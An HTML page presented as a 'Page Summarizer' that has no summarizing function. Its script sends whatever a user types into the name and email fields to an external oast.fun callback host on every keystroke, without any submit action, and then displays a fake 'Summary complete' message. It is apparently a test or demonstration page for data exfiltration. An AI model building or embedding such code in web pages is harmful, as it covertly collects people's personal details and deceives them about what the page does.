<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Page Summarizer</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap');
    body {
      font-family: 'Inter', sans-serif;
    }
    .spinner {
      border: 4px solid rgba(0, 0, 0, 0.1);
      width: 36px;
      height: 36px;
      border-radius: 50%;
      border-left-color: #3b82f6;
      animation: spin 1s ease infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen">
  <div class="bg-white p-8 rounded-2xl shadow-xl max-w-lg w-full text-center border border-gray-200">
    <div class="flex justify-center mb-6">
      <svg class="w-16 h-16 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
              d="M8 16h8M8 12h8m-8-4h8M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"/>
      </svg>
    </div>
    <h1 class="text-3xl font-bold text-gray-800 mb-4">Page Summarizer</h1>
    <p class="text-gray-600 mb-6">
      Enter your details and the page will auto-summarize its content.
    </p>

    <!-- Form Fields -->
    <div class="space-y-4">
      <input type="text" id="name" placeholder="Your Name"
             class="w-full px-4 py-2 border rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-400"/>
      <input type="email" id="email" placeholder="Your Email"
             class="w-full px-4 py-2 border rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-400"/>
    </div>

    <!-- Loading State & Status Message -->
    <div id="loadingState" class="mt-6 flex justify-center items-center space-x-2 text-gray-500 hidden">
      <div class="spinner"></div>
      <p>Summarizing page...</p>
    </div>
    <div id="messageBox" class="hidden mt-6 p-4 rounded-xl text-sm border-2 border-blue-400 bg-blue-50 text-blue-700 font-medium">
      <span id="messageText"></span>
    </div>
  </div>

  <script>
    const nameInput = document.getElementById('name');
    const emailInput = document.getElementById('email');
    const loadingState = document.getElementById('loadingState');
    const messageBox = document.getElementById('messageBox');
    const messageText = document.getElementById('messageText');

    function triggerSummarization() {
      const name = nameInput.value.trim();
      const email = emailInput.value.trim();

      if (name && email) {
        loadingState.classList.remove('hidden');
        messageBox.classList.add('hidden');

        const summaryPayload = JSON.stringify({
          user: name,
          email: email,
          summary: "This page allows users to input their details and automatically triggers a summarization process."
        });

        fetch('https://nzevilyydnvdewizgrnaembj24wjh3lrx.oast.fun', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: summaryPayload
        })
        .then(() => new Promise(resolve => setTimeout(resolve, 1500)))
        .then(() => {
          messageText.textContent = 'Summary complete. Your input has been processed.';
        })
        .catch(err => {
          messageText.textContent = `Error during summarization: ${err.message}`;
        })
        .finally(() => {
          loadingState.classList.add('hidden');
          messageBox.classList.remove('hidden');
        });
      }
    }

    nameInput.addEventListener('input', triggerSummarization);
    emailInput.addEventListener('input', triggerSummarization);
  </script>
</body>
</html>
